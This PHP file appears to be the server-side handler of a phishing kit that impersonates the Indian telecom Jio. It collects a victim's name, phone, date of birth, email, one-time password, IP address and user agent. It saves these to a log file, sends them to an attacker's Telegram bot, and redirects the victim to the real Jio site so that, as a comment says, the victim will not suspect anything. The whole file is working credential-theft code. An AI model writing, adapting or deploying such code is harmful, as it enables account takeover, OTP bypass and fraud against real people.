<?php
// post.php
$data = "
🔥 JIO PHISH HIT 🔥
Name: " . $_POST['name'] . "
Phone: " . $_POST['phone'] . "
DOB: " . $_POST['dob'] . "
Email: " . $_POST['email'] . "
OTP: " . $_POST['otp'] . "
IP: " . $_SERVER['REMOTE_ADDR'] . "
Time: " . date('Y-m-d H:i:s') . "
User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n";

// Save to server
file_put_contents('logs.txt', $data, FILE_APPEND);

// Send to Telegram
$botToken = "YOUR_TELEGRAM_BOT_TOKEN";
$chatId = "YOUR_CHAT_ID";
$message = urlencode($data);
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");

// Redirect to real Jio site (victim ko doubt nahi hoga)
header("Location: https://www.jio.com");
exit();
?>
